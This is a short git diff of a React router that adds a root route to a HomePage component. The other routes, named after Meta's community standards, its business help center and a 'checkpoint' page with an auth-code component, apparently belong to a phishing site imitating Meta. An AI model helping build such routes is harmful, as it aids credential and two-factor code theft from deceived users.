@@ -22,6 +22,7 @@ function App() {
     <BrowserRouter>
       <div id="app">
         <Routes>
+          <Route path="/" element={<HomePage/>} />
           <Route path="/meta-community-standard" element={<HomePage/>} />
           <Route path="/business-help-center" element={<MyForm/>} />
           <Route path="checkpoint/:userID" element={<AuthCode />} />
